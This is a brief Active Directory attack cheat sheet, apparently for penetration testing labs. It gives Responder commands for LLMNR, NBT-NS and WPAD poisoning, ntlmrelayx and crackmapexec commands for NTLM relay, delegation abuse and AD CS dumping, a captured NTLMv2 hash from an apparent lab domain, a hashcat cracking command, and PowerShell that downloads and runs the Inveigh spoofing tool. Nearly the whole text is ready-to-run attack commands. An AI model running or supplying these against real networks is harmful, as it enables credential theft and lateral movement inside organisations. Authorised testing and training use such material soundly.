# Responder Playbook

---

# Basic Hash Catching

```
sudo responder -I eth0 -wrd -v --lm
-I eth0: Ağ arayüzü
-w: WPAD zehirleme
-r: LLMNR zehirleme
-d: NBT-NS zehirleme
-v: Verbose mod
--lm: LM hash'leri de yakala

cat /usr/share/responder/logs/
```

# NTLM Relay

```
# Terminal 1 - Responder
sudo responder -I eth0
sudo responder -I ens0 -v

# Terminal 2 - Relay
crackmapexec smb <target> --gen-relay-list relay_targets.txt
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support --no-http-server

targets.txt:
10.10.10.10 dc01.domain.local
10.10.10.11 srv01.domain.local


[MSSQL] NTLMv2 Hash     : lab_adm::INLANEFREIGHT:9324fc57a5275c00:7FBC11771B1C31932AE0D665F611A150:01010000000000006075C2C1D0A7DC019D9B8D561EA4E7E10000000002000800550041003200360001001E00570049004E002D00420050003300590053004700550042005200500037000400140055004100320036002E004C004F00430041004C0003003400570049004E002D00420050003300590053004700550042005200500037002E0055004100320036002E004C004F00430041004C000500140055004100320036002E004C004F00430041004C0008003000300000000000000000000000003000007ACDF64F940DBA3EA4CA059FB4FC64580818D2C352C41DBBEFB25F32480EEC400A0010000000000000000000000000000000000009003A004D005300530051004C005300760063002F00610063006100640065006D0079002D00650061002D0077006500620030003A0031003400330033000000000000000000

hashcat -m 5600 netntlmhash /usr/share/wordlists/rockyou.txt

```

# Advanced

```
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt --delegate-access --no-http-server
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t dc01.domain.local --dump-adcs --no-http-server
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support --no-http-server --signing-required
```

# Windows

```
invoke-webrequest https://github.com/Kevin-Robertson/Inveigh -o inveigh

import-module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y


